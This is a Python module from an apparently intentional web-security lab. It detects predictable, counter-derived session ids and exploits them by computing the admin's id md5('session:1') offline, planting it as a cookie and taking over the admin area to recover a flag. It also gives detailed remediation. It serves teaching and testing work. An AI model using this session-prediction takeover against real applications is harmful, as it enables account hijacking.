r"""Predictable session ids -> admin session hijacking (session takeover).

WHAT IT IS
----------
The demo app issues session ids the way the real-world code it models does: from
a low-entropy, *recoverable* scheme instead of a cryptographically-secure RNG.
The lab models it faithfully in :mod:`weblab.targetapp.weak_random`::

    # the server's session-id generator (recovered, e.g. from source / a leak):
    def session_for(counter: int) -> str:
        return md5(f"session:{counter}".encode()).hexdigest()

    # POST /api/login-weak  {"username": "<u>"}  ->  _login_weak():
    #     self.session_counter += 1                      # a GLOBAL, sequential counter
    #     sid = session_for(self.session_counter)        # no secret, no real entropy
    #     sessions[sid] = username
    #     Set-Cookie: session=<sid>
    #     return {"session_reference": self.session_counter}  # <- counter HANDED BACK

The fatal flaw: the session id is a pure function of a **sequential integer
counter** -- ``md5("session:<n>")`` -- with **no secret key and no real
randomness**, so anyone who learns the scheme can compute the session id for any
counter value. The server even hands the counter back as a ``session_reference``.

The admin logged in FIRST, so the admin's session was minted at ``counter=1``
(``session_for(1)``). Every later login (the attacker's included) is handed a
HIGHER, sequential reference (``>=2``). An attacker therefore does not need to
steal the admin's cookie over the wire, phish it, or brute-force 128 bits of
randomness: they log in once to learn the scheme/sequence, observe their own
reference is ``>=2`` (so an EARLIER session exists at counter ``1``), and compute
the admin's earlier session id directly as ``session_for(1)``. Planting that id
in the ``session`` cookie and hitting the admin area returns the planted prize,
:data:`C.FLAGS["session_hijacking"]` -- proof of full admin-session takeover.

HOW WE DISCOVER IT
------------------
Three signals establish the weakness before we ever touch the admin session:

1.  **The reference is sequential / predictable (the structural tell).** We log
    in several times via ``POST /api/login-weak`` and observe the returned
    ``session_reference`` values form a contiguous, increment-by-1 sequence
    (2, 3, 4 ...). A session reference an attacker can *count off* -- rather than
    an opaque 128-bit random -- is the smoking gun for predictable session ids.

2.  **The handed-back cookie EQUALS our offline prediction (the link).** The
    ``Set-Cookie: session=<sid>`` value the server returns for reference ``R`` is
    byte-for-byte ``session_for(R)``. Matching the live cookie to a value we
    computed locally proves the id is fully derived from the counter -- nothing
    secret is mixed in.

3.  **A bogus/unknown session id is unauthenticated (the control).** A made-up
    cookie value is NOT a valid session -- the admin area rejects it (403). This
    proves the admin area genuinely checks the session (it is not an open door),
    so reaching it later with ``session_for(1)`` is a real takeover.

HOW WE EXPLOIT IT
-----------------
Admin-session takeover with no cookie theft and no admin credentials:

    POST /api/login-weak  {"username": "attacker"}  -> {"session_reference": R}  (R >= 2)
    admin_sid = session_for(1)        # the admin's EARLIER session, predicted offline
    # on a FRESH client carrying no session of its own:
    client.set_cookie("session", admin_sid)     # (or send a Cookie: session=<sid> header)
    GET /admin            -> 200 {"area": "admin", "flag": C.FLAGS["session_hijacking"]}

The 200 + flag is the takeover: we authenticated AS the admin using a session id
we predicted from the scheme alone, never possessing the admin's cookie. We
recover the flag from that response.

THE FIX
-------
See :data:`REMEDIATION`. In one line: mint session ids from a CSPRNG with >=128
bits of entropy (never a counter/timestamp/predictable seed), and harden the
cookie (HttpOnly, Secure, SameSite, rotation on privilege change, server-side
expiry/binding) so a session id can be neither predicted nor replayed.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C
from .targetapp.weak_random import session_for  # the recovered weak-session scheme

REMEDIATION: str = (
    "Generate session ids (and CSRF tokens, API keys, password-reset tokens -- "
    "any security value) from a CRYPTOGRAPHICALLY-SECURE RNG, never from a "
    "predictable source. The bug here is two-fold and both halves must be fixed: "
    "(1) the session id is a pure function of a SEQUENTIAL counter with no secret "
    "and no entropy (md5('session:'+n)), so any user's id is computable from a "
    "counter value; and (2) the server HANDS BACK that counter as a "
    "'session_reference', and because the admin logged in first their id is simply "
    "session_for(1). Fixes: (a) Do NOT roll your own session ids -- let the "
    "framework's session manager generate them from a CSPRNG with >=128 bits of "
    "entropy: PHP session.use_strict_mode=1 with session.sid_length/"
    "sid_bits_per_character at defaults (or session_create_id), ASP.NET Core's "
    "built-in session/cookie auth (RandomNumberGenerator-backed) -- NOT rand()/"
    "mt_rand(), a counter, a timestamp, an auto-increment id, or a seeded PRNG. "
    "(b) NEVER return the session id, a 'reference', a counter, or any value from "
    "which the id can be derived in an HTTP response body. (c) Set the cookie "
    "HttpOnly, Secure, and SameSite=Lax/Strict, scoped to the narrowest Path/"
    "Domain, so it cannot be read by script or replayed cross-site. (d) ROTATE the "
    "session id on every privilege change (login, role elevation) and INVALIDATE "
    "it server-side on logout/timeout -- prevents fixation and limits replay. "
    "(e) BIND the session to server-side state with a short idle/absolute expiry; "
    "optionally pin to client attributes and detect anomalous reuse. (f) "
    "Rate-limit and monitor for sequential/colliding session ids. In PostgreSQL, "
    "gen_random_uuid()/pgcrypto are for ids and CSPRNG bytes -- never derive a "
    "session token from a serial column. The same rule governs all "
    "security-sensitive randomness in any stack: use a vetted CSPRNG, never a "
    "guessable scheme."
)

#: The weak-login endpoint under test (POST). It mints a sequential session id and
#: hands the counter back as ``session_reference``.
LOGIN_ENDPOINT: str = "/api/login-weak"

#: The admin-only area the hijacked session unlocks (GET). It returns the flag
#: only when the request carries a session that maps to the ``admin`` user.
ADMIN_ENDPOINT: str = "/admin"
HTTP_METHOD: str = "POST"

#: The user we control; logging in as them reveals the scheme and our reference.
ATTACKER_USERNAME: str = "attacker"

#: The victim we take over. The admin logged in FIRST, so the admin's session was
#: minted at this counter value -- ``session_for(ADMIN_COUNTER)`` is its id.
TARGET_USERNAME: str = "admin"
ADMIN_COUNTER: int = 1

#: A made-up session id used as the detection control: it must NOT authenticate,
#: proving the admin area genuinely validates the session (it is not open).
CONTROL_BOGUS_SID: str = "deadbeefdeadbeefdeadbeefdeadbeef"

#: How many sequential logins to sample when proving predictability.
_SEQUENCE_PROBES: int = 3

#: The payloads this module sends, for the report. The real "payload" is the
#: PREDICTED admin session id ``session_for(1)`` planted in the cookie.
PAYLOADS: List[str] = [
    'POST /api/login-weak {"username": "attacker"}  -> read {"session_reference": R}  (R >= 2)',
    "observe references are sequential (2, 3, 4 ...) -> an EARLIER session exists at counter 1",
    "admin_sid = session_for(1)   # md5('session:1'), predicted OFFLINE -- the admin logged in first",
    "set Cookie: session=<admin_sid> on a FRESH client (no session of its own)",
    "GET /admin   -> 200 {area: admin, flag}  (authenticated AS admin via a predicted id)",
]


# --- low-level probes --------------------------------------------------------
def _login(client: WebClient, username: str) -> Response:
    """Drive ``POST /api/login-weak`` -> ``{"session_reference": <counter>}``."""
    return client.post(LOGIN_ENDPOINT, json={"username": username})


def _reference_of(resp: Response) -> Optional[int]:
    """Extract the handed-back sequential ``session_reference`` (counter)."""
    if resp.status != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    ref = body.get("session_reference") if isinstance(body, dict) else None
    return ref if isinstance(ref, int) else None


def _cookie_sid_of(resp: Response) -> Optional[str]:
    """Pull the ``session=<sid>`` value out of the response's ``Set-Cookie``."""
    raw = resp.header("Set-Cookie")
    if not raw:
        return None
    prefix = f"{C.SESSION_COOKIE}="
    for part in raw.split(";"):
        part = part.strip()
        if part.startswith(prefix):
            return part[len(prefix):]
    return None


def _get_admin_with_sid(client: WebClient, sid: str) -> Response:
    """GET the admin area carrying ``sid`` as the session cookie (header form).

    Uses an explicit ``Cookie`` header rather than mutating the shared jar, so a
    probe can present an arbitrary id without disturbing the client's own state.
    """
    return client.get(ADMIN_ENDPOINT, headers={"Cookie": f"{C.SESSION_COOKIE}={sid}"})


def _admin_unlocked(resp: Response, flag: str) -> bool:
    """True if the admin area authenticated us (HTTP 200 carrying the flag)."""
    if resp.status != 200:
        return False
    if flag not in resp.text:
        return False
    try:
        body = resp.json()
    except ValueError:
        return True  # flag present even if body is not strict JSON
    return isinstance(body, dict) and body.get("area") == "admin"


# --- detection ---------------------------------------------------------------
def detect_sequential_references(
    client: WebClient, probes: int = _SEQUENCE_PROBES
) -> Tuple[bool, List[int], str]:
    """Structural tell: the returned ``session_reference`` values are sequential.

    Logs in ``probes`` times and checks the references form a contiguous,
    increment-by-1 integer sequence -- the signature of a counter-based (weak)
    session scheme rather than opaque 128-bit randomness. Returns
    ``(is_sequential, references, evidence)``.
    """
    refs: List[int] = []
    for _ in range(probes):
        ref = _reference_of(_login(client, ATTACKER_USERNAME))
        if ref is None:
            return False, refs, ""
        refs.append(ref)
    sequential = len(refs) >= 2 and all(
        b - a == 1 for a, b in zip(refs, refs[1:])
    )
    if sequential:
        evidence = (
            f"{HTTP_METHOD} {LOGIN_ENDPOINT} returned a contiguous, increment-by-1 "
            f"session_reference sequence {refs} (all >= 2, so an EARLIER session "
            f"exists at counter {ADMIN_COUNTER}) -- a guessable counter, not an "
            f"opaque random session id (predictable session ids)"
        )
        return True, refs, evidence
    return False, refs, ""


def detect_cookie_matches_prediction(
    client: WebClient,
) -> Tuple[bool, Optional[int], str, str]:
    """Link: the live ``Set-Cookie`` session id EQUALS our offline prediction.

    Logs in as the attacker, reads both the handed-back reference ``R`` and the
    ``Set-Cookie: session=<sid>`` value, and checks ``sid == session_for(R)``
    byte-for-byte -- proving the id is fully derived from the counter with nothing
    secret mixed in. Returns ``(ok, reference, observed_sid, evidence)``.
    """
    resp = _login(client, ATTACKER_USERNAME)
    ref = _reference_of(resp)
    observed = _cookie_sid_of(resp)
    if ref is None or observed is None:
        return False, ref, observed or "", ""
    predicted = session_for(ref)
    if observed == predicted:
        evidence = (
            f"the live cookie session={observed} for reference {ref} equals our "
            f"offline session_for({ref}) = md5('session:{ref}') byte-for-byte -- "
            f"the session id is a pure function of the counter (no secret entropy)"
        )
        return True, ref, observed, evidence
    return False, ref, observed, ""


def detect_bogus_sid_rejected(
    client: WebClient, sid: str = CONTROL_BOGUS_SID
) -> Tuple[bool, str]:
    """Control: a made-up session id is NOT authenticated at the admin area.

    Proves the admin endpoint really validates the session -- so reaching it
    later with ``session_for(1)`` is a genuine takeover, not an open door.
    """
    flag = C.FLAGS["session_hijacking"]
    resp = _get_admin_with_sid(client, sid)
    if resp.status == 403 and flag not in resp.text:
        return True, (
            f"a bogus session id ({sid!r}) was rejected at {ADMIN_ENDPOINT} "
            f"(HTTP {resp.status}, no flag) -- the admin area really validates the "
            f"session (not an open door)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_admin_session_takeover(
    client: WebClient,
) -> Tuple[bool, Optional[str], int, str, str]:
    """Hijack the admin's predictable session and recover the flag.

    Logs in once as the attacker to confirm our reference is ``>= 2`` (an earlier
    admin session exists), predicts ``session_for(1)`` offline, plants it on a
    FRESH client carrying no session of its own, and GETs the admin area. Using a
    fresh client guarantees the flag comes from the PREDICTED admin id, not from
    any session this client was issued. Returns
    ``(ok, flag, admin_counter, predicted_admin_sid, raw_body)``.
    """
    flag_value = C.FLAGS["session_hijacking"]

    # Learn the scheme: our own reference must be >= 2, i.e. earlier sessions exist.
    own_ref = _reference_of(_login(client, ATTACKER_USERNAME))
    predicted_admin_sid = session_for(ADMIN_COUNTER)
    if own_ref is None or own_ref < ADMIN_COUNTER + 1:
        return False, None, ADMIN_COUNTER, predicted_admin_sid, ""

    # Fresh client with NO session of its own -> the flag can only come from the
    # predicted admin id we plant (via set_cookie, per the contract).
    attacker = WebClient(client.base_url, allow_remote=client.allow_remote)
    attacker.set_cookie(C.SESSION_COOKIE, predicted_admin_sid)
    resp = attacker.get(ADMIN_ENDPOINT)
    if _admin_unlocked(resp, flag_value):
        return True, flag_value, ADMIN_COUNTER, predicted_admin_sid, resp.text
    return False, None, ADMIN_COUNTER, predicted_admin_sid, resp.text


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect predictable session ids, then hijack admin's session (recover flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["session_hijacking"]`` together with the predicted admin session id
    and the counter it derives from, with ``extra`` proving the takeover is real:
    references are sequential and ``>= 2``, the live cookie matches our offline
    prediction, a bogus id is 403, yet ``session_for(1)`` -- the admin's earlier
    session -- authenticates us as admin without ever stealing the admin's cookie.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    seq_ok, refs, seq_ev = detect_sequential_references(client)
    if seq_ok:
        techniques.append("sequential-references")

    match_ok, match_ref, observed_sid, match_ev = detect_cookie_matches_prediction(
        client
    )
    if match_ok:
        techniques.append("cookie-equals-offline-prediction")

    control_ok, control_ev = detect_bogus_sid_rejected(client)
    if control_ok:
        techniques.append("bogus-sid-rejected-403")

    # 2) Exploitation: admin-session takeover -------------------------------
    ok, flag, admin_counter, admin_sid, admin_body = exploit_admin_session_takeover(
        client
    )
    if ok:
        techniques.append("admin-session-hijack-flag")

    # Discovery requires the full chain: sequential references + the live cookie
    # matching our offline prediction + a validating admin area (control 403) +
    # the admin-session takeover recovering the flag. This rules out an open door
    # (control would not be 403) and a non-predictable scheme (cookie-match /
    # exploit would not succeed).
    discovered = bool(seq_ok and match_ok and control_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if seq_ok:
        evidence_parts.append(f"sequence: {seq_ev}")
    if match_ok:
        evidence_parts.append(f"match: {match_ev}")
    if control_ok:
        evidence_parts.append(f"control: {control_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result: Dict[str, object] = {
        "flag": flag,
        "target_username": TARGET_USERNAME,
        "admin_counter": admin_counter,
        "predicted_admin_sid": admin_sid,
        "admin_area_body": admin_body,
        "own_username": ATTACKER_USERNAME,
        "sampled_references": refs,
        "matched_reference": match_ref,
        "observed_cookie_sid": observed_sid,
        "control_bogus_sid": CONTROL_BOGUS_SID,
        "scheme": "md5('session:'+<sequential-counter>)",
        "techniques": techniques,
        "summary": (
            f"session_reference values from {HTTP_METHOD} {LOGIN_ENDPOINT} are "
            f"sequential and >= 2 ({refs}); the live cookie equals session_for("
            f"{match_ref}) offline; a bogus session id is rejected 403; yet "
            f"session_for({admin_counter}) = {admin_sid} (md5('session:"
            f"{admin_counter}'), the admin's EARLIER session, predicted OFFLINE) "
            f"authenticated us as {TARGET_USERNAME!r} at {ADMIN_ENDPOINT}, "
            f"recovering flag {flag!r} -- admin-session takeover via predictable "
            f"session ids, no cookie theft"
        ),
    }

    return Finding(
        vuln="Session Hijacking (predictable session id -> admin takeover)",
        endpoint=LOGIN_ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=admin_sid or "",
        extra={
            "techniques": techniques,
            "sequential_references": seq_ok,
            "sampled_references": refs,
            "cookie_matches_prediction": match_ok,
            "matched_reference": match_ref,
            "observed_cookie_sid": observed_sid,
            "control_rejected": control_ok,
            "control_status": 403,
            "control_bogus_sid": CONTROL_BOGUS_SID,
            "admin_session_hijack": ok,
            "target_username": TARGET_USERNAME,
            "admin_counter": admin_counter,
            "predicted_admin_sid": admin_sid,
            "flag_recovered": ok,
            "admin_endpoint": ADMIN_ENDPOINT,
            "scheme": "md5('session:'+<sequential-counter>)",
        },
    )
